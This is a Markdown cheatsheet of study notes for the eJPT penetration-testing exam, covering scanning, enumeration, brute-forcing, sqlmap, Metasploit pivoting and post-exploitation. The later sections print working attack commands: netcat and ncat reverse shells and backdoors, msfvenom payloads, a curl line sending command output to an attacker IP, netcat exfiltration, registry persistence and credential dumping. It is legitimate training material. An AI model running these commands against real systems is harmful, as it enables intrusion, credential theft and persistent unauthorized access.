# eJPT Notes 2023 *(eLearnSecurity Junior Penetration Tester)*

<p align="center">
   <img src="https://user-images.githubusercontent.com/71322795/230566069-383ff210-25a5-4dd5-8e61-060feec558ee.jpg">
</p>

### Cheatsheet to prepare for the eLearnSecurity eJPT certification exam.

----------

> **Note**
> I wrote down everything important from my INE course for eJPT certification. I believe this 'cheatsheet' has everything you need to pass the exam.

# Enumeration
#### Let's find out what we are working with.  We are completely blind.

### Host Discovery

### Ping Sweep, who can we find on the network?


#### fping:
````bash
fping -a -g {IP RANGE} 2>/dev/null
````
#### fping example:
````bash
fping -a -g 10.10.10.0/8 2>/dev/null
`````
#### Nmap Ping Sweep:
````bash
 nmap -sn 10.10.10.0/8 | grep -oP '(?<=Nmap scan report for )[^ ]*'
````

# Enumerate Hosts Found on Network
#### Once you have found alive hosts on a network, its time to knock on the doors.

#### Nmap TCP Quick Scan (step 1)
````bash
nmap -sC -sV <IP>
````
#### Nmap TCP Full Scan (Step 2)
````bash
nmap -sC -sV -p- <IP>
````
#### Nmap UDP Quick Scan
````bash
nmap -sU -sV <IP>
````
#### Always save your scans, you never know when you need to pull them up.
````bash
nmap -sn 10.10.10.0/24 -oN hosts.nmap
````

# Find Common Vulnerabilities
#### After you have done all of your scans, and identified open ports on your target, it's time to see if any services are vulnerable.

#### Common Ports to Look at:
| Port | Protocol |
| ------------- |:---------------:|
| 21 | FTP |
| 22 | SSH |
| 23 | TELNET |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 443 | HTTPS |
| 110 | POP3 |
| 143 | IMAP |
| 135 | MSRPC |
| 137 | NETBIOS |
| 138 | NETBIOS |
| 139 | NETBIOS |
| 445 | SMB |
| 3306 | MYSQL | 
| 1433 | MYSQL | 
| 3389 | RDP |
| 8080 | HTTP Proxy |

### Use Nmap as a Lightweight Vulnerability Scanner
````bash
nmap -sV --script=vulners -v <IP>
````

## Port 21 - FTP Enumeration
##### Old versions of FTP maybe vulnerable. Always check the version. Search for the exploit using Google / Searchsploit / Rapid7. If you find some credential, try it on SSH / Login page / database.

#### Enumerate FTP Service with Nmap:
````bash
nmap --script=ftp-anon,ftp-bounce,ftp-brute,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 <IP>
````
#### Check for FTP Vulnerabilities with Nmap:
````bash
nmap --script=ftp-* -p 21 <IP>
````
#### Connect to FTP Service:
````bash
ftp <IP>
````
````bash
ncftp <IP>
````
##### Many ftp-servers allow anonymous users. anonymous:anonymous

#### Bruteforce FTP with a Known Username You Found:
````bash
hydra -l $user -P /usr/share/john/password.lst ftp://<IP>:21
````
````bash
hydra -l $user -P /usr/share/wordlistsnmap.lst -f <IP> ftp -V
````
````bash
medusa -h <IP> -u $user -P passwords.txt -M ftp
````

#### Enumerate Users on FTP Service:
````bash
ftp-user-enum.pl -U users.txt -t <IP>
````
````bash
ftp-user-enum.pl -M iu -U users.txt -t <IP>
````

#### Always Check for FTP Configuration Files:
````bash
• ftpusers
• ftp.conf
• proftpd.conf
````
##### Vulnerable FTP Versions:
````bash
• ProFTPD-1.3.3c Backdoor
• ProFTPD 1.3.5 Mod_Copy Command Execution
• VSFTPD v2.3.4 Backdoor Command Execution
````
#### FTP Exploitation Methodology:
````bash
1. Gather version numbers
2. Check Searchsploit
3. Check for Default Creds
4. Use Creds previously gathered
5. Download the software
````
## Port 445 - SMB Enumeration
#### Always check for SMB.  You might get lucky and find a vulnerable machine running SMB that has remote code execution.  Remember to use searchsploit, or google to check all service versions for publicly available exploits.

#### Scan for NETBIOS/SMB Service with Nmap:
````bash
nmap -p 139,445 --open -oG smb.txt 192.168.1.0/24
````
#### Scan for NETBIOS/SMB Service with nbtscan:
````bash
nbtscan -r 192.168.1.0/24
````

#### Enumerate the Hostname:
````bash
nmblookup -A <IP>
````
#### Check for Null Sessions:
````bash
smbmap -H <IP>
````
````bash
rpcclient -U "" -N <IP>
````
````bash
smbclient \\\\$ip\\ShareName
`````
##### if getting error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"
````bash
smbclient -L //<IP>/ --option='client min protocol=NT1'
````

#### List Shares:
````bash
smbmap -H <IP>
````
````bash
echo exit | smbclient -L \\\\10.10.10.10
````
````bash
nmap --script smb-enum-shares -p 139,445 <IP>
````
#### Check for SMB Vulnerabilities with Nmap:
````bash
nmap --script smb-vuln* -p 139,445 <IP>
````
#### Vulnerable Versions:
````bash
• Windows NT, 2000, and XP (most SMB1) - VULNERABLE: Null Sessions can be created by default
• Windows 2003, and XP SP2 onwards - NOT VULNERABLE: Null Sessions can't be created default
• Most Samba (Unix) servers
````
#### List of SMB versions and corresponding Windows versions:
````bash
• SMB1 – Windows 2000, XP and Windows 2003.
• SMB2 – Windows Vista SP1 and Windows 2008
• SMB2.1 – Windows 7 and Windows 2008 R2
• SMB3 – Windows 8 and Windows 2012.
````

# Web Application Enumeration / Exploitation - Port 80,443,8080
#### Make sure that you enumerate, and enumerate some more. :wink:
## Web Application Enumeration Checklist:
````bash
1. Checkout the entire webpage and what it is displaying.
2. Read every page, look for emails, names, user info, etc.
3. Directory Discovery (time to dir bust!)
4. Enumerate the interface, what is the CMS & Version? Server installation page?
5. Check for potential Local File Inclusion, Remote File Inclusion, SQL Injection, XXE, and Upload vulnerabilities
6. Check for a default server page, identify the server version
7. View Source Code:
      a. Check for hidden values
      b. Check for comments/developer remarks
      c. Check for Extraneous Code
      d. Check for passwords
8. Check for robots.txt file
9. Web Scanning
````
### Directory Discovery/Dir Busting:
````bash
gobuster dir -u <IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt
````
#### Gobuster Quick Directory Discovery
````bash
gobuster -u $ip -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux
`````
#### Gobuster Directory Busting:
````bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Top1000-RobotsDisallowed.txt; gobuster -u http://10.10.10.10. -w Top1000-RobotsDisallowed.txt
````
````bash
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o gobuster-root -t 50
````
#### Gobuster comprehensive directory busting:
````bash
gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
````
#### Gobuster search with file extension:
````bash
gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php
````
#### wfuzz search with files:
````bash
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200 http://10.10.10.10/FUZZ
````
#### Erodir by PinkP4nther
````bash
./erodir -u http://10.10.10.10 -e /usr/share/wordlists/dirb/common.txt -t 20
````
#### dirsearch.py
````bash
cd /root/dirsearch; python3 dirsearch.py  -u http://10.10.10.10/ -e .php
````
#### If you are really stuck, run this:
````bash
for file in $(ls /usr/share/seclists/Discovery/Web-Content); do gobuster -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/$file -e -k -l -s "200,204,301,302,307" -t 20 ; done
````
#### Check different extensions:
````bash
sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
````

## SQL Injection Testing (automated!)
#### if you follow the above check list, you should have a list of parameters to test for SQL injection. Automate it with SQLMAP!

#### SQLmap Commands:
````bash
sqlmap -u http://10.10.10.10 -p parameter
sqlmap -u http://10.10.10.10  --data POSTstring -p parameter
sqlmap -u http://10.10.10.10 --os-shell
sqlmap -u http://10.10.10.10 --dump
````
# Password Cracking
<img src="https://user-images.githubusercontent.com/71322795/230561246-e7aad24f-3fb8-4d23-ad6f-8ca834827e25.png" width=50% height=50%>

#### I highly suggest you learn how to use John The Ripper, Hydra, and how to unshadow passwd files.

### Unshadow
#### This will prepare the file for John The Ripper, you need a Passwd & Shadow File.
````bash
unshadow passwd shadow > unshadow
````
### Hash Cracking - John The Ripper
````bash
john --wordlist /path/to/wordlist hashfile
````

# Networking - Routing
#### I highly recommend that you get comfortable with general networking and routing concepts, including be able to read and understand .PCAP files.
![image](https://user-images.githubusercontent.com/80599694/147913167-35155f9d-f7f5-473e-90f9-302f0b5d7bb2.png)

### Set up IP Routing and Routing Tables
````bash
ip route - prints the routing table for the host you are on
ip route add ROUTETO via ROUTEFROM - add a route to a new network if on a switched network and you need to pivot
````

### ARP Spoofing
````bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
````
### SSH Tunneling / Port Forwarding
````bash
# local port forwarding
# the target host 192.168.0.100 is running a service on port 8888
# and you want that service available on the localhost port 7777

ssh -L 7777:localhost:8888 user@192.168.0.100

# remote port forwarding
# you are running a service on localhost port 9999 
# and you want that service available on the target host 192.168.0.100 port 12340

ssh -R 12340:localhost:9999 user@192.168.0.100

# Local proxy through remote host
# You want to route network traffic through a remote host target.host
# so you create a local socks proxy on port 12001 and configure the SOCKS5 settings to localhost:12001

ssh -C2qTnN -D 12001 user@target.host
````
### Network/Service Attacks
#### You may need to bruteforce a service running, such as SSH, FTP, etc. Just replace the service name below to bruteforce.
```bash
hydra -L users.txt -P pass.txt -t <IP> ssh -s 22
hydra -L users.txt -P pass.txt telnet://<IP>
```
# Using Metasploit
![image](https://user-images.githubusercontent.com/71322795/230562482-f159fb50-a00b-423b-9fa5-f2fe2bdccb94.png)

#### I highly recommend getting comfortable with metasploit, and meterpreter just incase you find Remote Code Execution, and spawn a shell.

### Basic Metasploit Commands

```bash
msfconsole
```
```bash
show -h
```
```bash
search <keyword(s)>
```
```bash
use <path-to-exploit>
```
```bash
show options
```
```bash
set <option-name> <option-value> 
```
```bash
exploit
```

Tip: Use `show payloads` when an exploit is selected to show only the available payloads for that exploit  
Tip: Use `info` when an exploit is selected to get information about the exploit  
Tip: Use `back` when an exploit is selected to return to unselect it  

#### Meterpreter
Inside metasploit:
  - `search meterpreter`
  - `set payload <payload-path>`
  - `background`
  - `sessions -l` (list the sessions)
  - `sessions -i <session-id>` (resume a background session)
  - `sysinfo`
  - `ifconfig`
  - `route`
  - `getuid`
  - `getsystem`
  - You can use Unix-like commands like `pwd`, `ls`, `cd`...
  - `download <filename> <location>`
  - `upload <filename> <location>`
  - `shell`
  - `hashdump`
  - `run autoroute -h`
  - `run autoroute -s 192.130.110.0 -n 255.255.255.0 ` (pivoting towards that network)

Tip: `help` shows an amazing list of available commands divided by category  
Tip: If `getsystem` fails, use `use exploit/windows/local/bypassuac`  
Tip: `ps -U SYSTEM` shows only the processes with SYSTEM privileges  
Tip: Use `post/windows/gather/hashdump` to dump the passwords DB and save it for an offline cracking session  

#### Pivoting with Meterpreter
Let's say we have compromised a machine using metasploit and we have a meterpreter shell with session id 1. We discover that there is another machine but it's reachable only from the compromised machine.  
Our IP: `192.180.40.2`  
Compromised host: `192.180.40.3`  
Unreachable machine: `192.130.110.3`  

- `meterpreter > run autoroute -s 192.130.110.0 -n 255.255.255.0 1`
- `background`
- `msf > route`

If we want to scan the `192.130.110.0/24` network we can use:
```
msf > use auxiliary/scanner/portscan/tcp
msf > set PORTS 80, 8080, 445, 21, 22, ...
msf > set RHOSTS 192.130.110.1-254
msf > exploit
```

If we discover that at least one port is open and we want to target a specific port on a specific host (e.g. `192.130.110.3:21`) we can use:
  - `sessions 1` (back to meterpreter session)
  - `portfwd add -l 1234 -p 21 -r 192.130.110.3` (forwarding remote machine port 21 to the local machine port 1234)
  - `portfwd list`
  - `background`

Then if we want to scan the service we can use nmap:
```bash
msf > nmap -sS -sV -p 1234 localhost
```


#### Reverse shell with Netcat
Attacker:
```bash
nc -lvp 8888 -e /bin/bash
```
Target (the IP of the attacker):
```bash
nc -v 192.168.1.1 8888
```

#### Generate a reverse shell payload with msfvenom
```bash
msfvenom --list payloads | grep <keyword>
```
```bash
msfvenom -p php/reverse_php lhost=192.168.0.58 lport=443 -o reverse.php
```
```bash
msfvenom -p linux/x64/shell/reverse_tcp lhost=192.168.0.58 lport=443 -f elf -o reverse443
chmod +x reverse443
```

Note: If you have generated a meterpreter payload shell, you have to use meterpreter in order to receive back the connection  


#### Blind Remote Code Execution
Target (Use the Attacker IP)
```bash
curl http://192.168.1.130:53/`whoami`
```
or 
```bash
curl http://192.168.1.130:53/`id | base64`
```
Attacker:
```bash
nc -lvp 53
```

Tip: You can also create a reverse shell with `msfvenom` and let the target download it  

#### Enumerating users history with meterpreter
- `background`
- `use post/linux/gather/enum_users_history`
- `set SESSION 1`
- `exploit`

#### Data exfiltration with Netcat
Receiver:
```bash
nc -lvnp 8888 > received.txt
```
Sender (the IP of the receiver):
```bash
cat message.txt | nc -v 192.168.1.1 8888
```

#### Backdoor using ncat
Victim:
```bash
ncat -l -p 5555 -e cmd.exe
```
Attacker (the IP of the victim):
```bash
ncat 192.168.1.66 5555
```

#### Reverse Backdoor using ncat
Attacker:
```bash
ncat -l -p 5555 -v
```
Victim (the IP of the attacker):
```bash
ncat -e cmd.exe 192.168.1.66 5555
```
Tip: For persistent reverse backdoor use the registry key `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

#### Reverse Backdoor using Metasploit
```bash
msfconsole
use exploit/windows/local/s4u_persistence
show options
sessions
set session <session-id>
set trigger logon
set payload windows/meterpreter/reverse_tcp
set lhost <local-ip>
set lport 1234
exploit
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set lhost <local-ip>
set lport 1234
exploit
sysinfo
ps
help
```
Tip: once we get a shell we can use `screenshot` to get a picture of what the victim is seeing on the Desktop  
Tip: once we get a shell we can use `download filename location` to save the filename in the specified location on our machine  
Tip: Same syntax as above but use `upload` to upload files  
Tip: Use `getsystem` to gain the highest privilege (i.e. SYSTEM) on the compromised machine and `getuid` to check if it actually worked.

#### Upgrading a simple shell
```bash
bash -i
```
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
export TERM=xterm  
Ctrl + Z  (Background Process)
stty raw -echo; fg
```

#### Maintaining access using Metasploit (Windows)
Inside a meterpreter session:
  - `background`
  - `use exploit/windows/local/persistence_service`
  - `show options`
  - `set SESSION <session-id>`
  - `exploit`

Use the backdoor:
  - `background`
  - `sessions -K`
  - `use exploit/multi/handler`
  - `set PAYLOAD windows/meterpreter/reverse_tcp`
  - `set LHOST <Your-IP>`
  - `set LPORT 4444`
  - `exploit` 

Note: The `<session-id>` is the one you can read when you type `background`  
Note: We need to use the same information about the backdoor to receive a new meterpreter session on the multi-handler. We can't change Payload, IP or Ports details.

#### Pivoting using a SOCKS Proxy
You have access to a compromised host and only from there you can access another machine. That machine exposes a web server, in order to access it from your computer set up a SOCKS proxy.

Add the route to the unreachable network using autoroute or route.

```bash
msf > use auxiliary/server/socks_proxy
msf > set VERSION 4a
msf > set SRVPORT 9050
msf > run -j
```

```bash
root@INE:~# proxychains nmap ...
```

Then you can also setup firefox in order to send request using the SOCKS proxy v4 at `127.0.0.1:9050`.

#### Dump AutoLogin stored credentials
Inside a meterpreter session:
  - `migrate -N explorer.exe`
  - `background`
  - `use post/windows/gather/credentials/windows_autologin`
  - `set SESSION <session-id>`
  - `exploit`

----------
